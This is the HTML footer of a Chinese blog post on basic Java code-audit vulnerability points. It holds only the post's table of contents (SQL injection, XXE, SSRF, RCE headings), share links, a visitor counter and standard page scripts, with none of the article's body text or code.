          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%A1%E8%AE%A1%E6%B5%81%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">审计流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">1.1.</span> <span class="toc-text">Servlet生命周期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Servlet%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.2.</span> <span class="toc-text">Servlet审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Springboot%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.3.</span> <span class="toc-text">Springboot审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JDBC%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">JDBC中的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E6%8B%BC%E6%8E%A5%E5%8F%82%E6%95%B0"><span class="toc-number">2.1.1.</span> <span class="toc-text">动态拼接参数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%99%E8%AF%AF%E4%BD%BF%E7%94%A8%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-number">2.1.2.</span> <span class="toc-text">错误使用预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Order-By%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.3.</span> <span class="toc-text">Order By注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mybatis%E4%B8%AD%E7%9A%84SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text">Mybatis中的SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MyBatis%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">MyBatis基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#MyBatis%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9"><span class="toc-number">2.2.1.1.</span> <span class="toc-text">MyBatis主要特点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mybatis%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.2.</span> <span class="toc-text">Mybatis的工作原理</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Mybatis%E7%9A%84%E4%BD%BF%E7%94%A8%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.2.1.3.</span> <span class="toc-text">Mybatis的使用步骤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MyBatis%E4%B8%AD-%E5%92%8C-%E5%8C%BA%E5%88%AB"><span class="toc-number">2.2.2.</span> <span class="toc-text">MyBatis中#{}和${}区别</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E-%EF%BC%9A"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">对于#{}：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AF%B9%E4%BA%8E"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">对于${}:</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84"><span class="toc-number">2.2.3.</span> <span class="toc-text">存在SQL注入漏洞的${}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORDER-BY%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">ORDER BY注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IN%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">IN注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LIKE%E6%B3%A8%E5%85%A5"><span class="toc-number">2.5.</span> <span class="toc-text">LIKE注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0%E7%82%B9"><span class="toc-number">2.6.</span> <span class="toc-text">SQL相关函数点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">3.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3%E5%BA%93"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞相关库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B"><span class="toc-number">3.2.</span> <span class="toc-text">测试实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#org-xml-sax-XMLReader"><span class="toc-number">3.2.1.</span> <span class="toc-text">org.xml.sax.XMLReader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-jdom2-input-SAXBuilder"><span class="toc-number">3.2.2.</span> <span class="toc-text">org.jdom2.input.SAXBuilder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#org-dom4j-io-SAXReader"><span class="toc-number">3.2.3.</span> <span class="toc-text">org.dom4j.io.SAXReader</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javax-xml-parsers-DocumentBuilder"><span class="toc-number">3.2.4.</span> <span class="toc-text">javax.xml.parsers.DocumentBuilder</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%90%8C%E7%90%86"><span class="toc-number">3.2.5.</span> <span class="toc-text">其它同理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">4.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E9%97%AE%E9%A2%98%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">可能存在问题的函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B-2"><span class="toc-number">4.2.</span> <span class="toc-text">测试实例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#HttpURLConnection-getInputStream"><span class="toc-number">4.2.1.</span> <span class="toc-text">HttpURLConnection.getInputStream</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HttpCLient-execute"><span class="toc-number">4.2.2.</span> <span class="toc-text">HttpCLient.execute</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%90%8C%E7%90%86-2"><span class="toc-number">4.2.3.</span> <span class="toc-text">其它同理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">5.</span> <span class="toc-text">RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">6.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&text=Java代码审计漏洞点(基础)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&is_video=false&description=Java代码审计漏洞点(基础)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java代码审计漏洞点(基础)&body=Check out this article: https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&title=Java代码审计漏洞点(基础)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&name=Java代码审计漏洞点(基础)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://x2nn.github.io/2025/04/01/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%BC%8F%E6%B4%9E%E7%82%B9(%E5%9F%BA%E7%A1%80)/&t=Java代码审计漏洞点(基础)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
      <div class="footer-left">
        Copyright &copy;
        
        
        2024-2025
        X2n.
      </div>
      <div class="footer-right">
        <nav>
          <ul>
            <!--
          --><li><a href="/">Home</a></li><!--
        --><!--
          --><li><a href="/archives/">Writing</a></li><!--
        --><!--
          --><li><a href="/tags/">Tag</a></li><!--
        --><!--
          --><li><a href="/categories/">Category</a></li><!--
        --><!--
          --><li><a href="/search/">Search</a></li><!--
        --><!--
          --><li><a href="/about/">About</a></li><!--
        -->
          </ul>
          <ul>
            
              <!-- 不蒜子统计 -->
              <span id="busuanzi_container_site_pv">
                  本站总访问量<span id="busuanzi_value_site_pv"></span>次
              </span>
              <span class="post-meta-divider">|</span>
              <span id="busuanzi_container_site_uv" style='display:none'>
                      本站访客数<span id="busuanzi_value_site_uv"></span>人
              </span>
            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            
          </ul>
        </nav>
      </div>
      
</footer>


    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
